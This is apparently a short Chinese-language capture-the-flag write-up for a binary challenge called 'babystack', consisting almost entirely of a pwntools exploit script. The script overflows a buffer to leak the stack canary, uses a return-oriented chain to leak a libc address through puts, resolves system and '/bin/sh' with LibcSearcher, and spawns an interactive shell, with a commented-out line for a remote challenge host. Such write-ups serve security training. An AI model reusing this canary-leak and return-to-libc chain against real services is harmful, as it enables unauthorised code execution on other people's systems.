# pwn1

题目给的libc-2.23.so不好用。  

本地跑不成功，远程跑成功。  

Exp:
```python
import pwn

pwn.context(arch='amd64', os='linux', log_level='debug')

p = pwn.process('./babystack')
#p = pwn.remote('220.249.52.133', 38263)
e = pwn.ELF('./babystack')
libc = pwn.ELF('./libc-2.23.so')

#start_addr = pwn.p64(e.sym['__libc_start_main']) --> WRONG!
main_addr = pwn.p64(0x400908)
puts_plt = pwn.p64(e.plt['puts'])
puts_got = pwn.p64(e.got['puts'])
pop_rdi_addr = pwn.p64(0x400a93)

payload1 = b'A' * 136     # 30 bytes be ate???
p.sendlineafter(b'>> ', b'1')
p.sendline(payload1)

p.sendlineafter(b'>> ', b'2')
p.recvuntil(b'A' * 136 + b'\n')
canary = b'\x00' + p.recv(7)    # get canary

# Wrong libc version?? Using LibcSearcher
payload2 = b'A' * 136 + canary + b'B' * 8 + pop_rdi_addr + puts_got + puts_plt + main_addr
p.sendlineafter(b'>> ', b'1')
p.sendline(payload2)

p.sendlineafter(b'>> ', b'3')
puts_addr = pwn.u64(p.recv(6) + b'\x00\x00')

import LibcSearcher

libc = LibcSearcher.LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = pwn.p64(libc_base + libc.dump('system'))
sh_addr = pwn.p64(libc_base + libc.dump('str_bin_sh'))

payload3 = b'A' * 136 + canary + b'B' * 8 + pop_rdi_addr + sh_addr + system_addr
p.sendlineafter(b'>> ', b'1')
p.sendline(payload3)

p.sendlineafter(b'>> ', b'3')
p.interactive()
```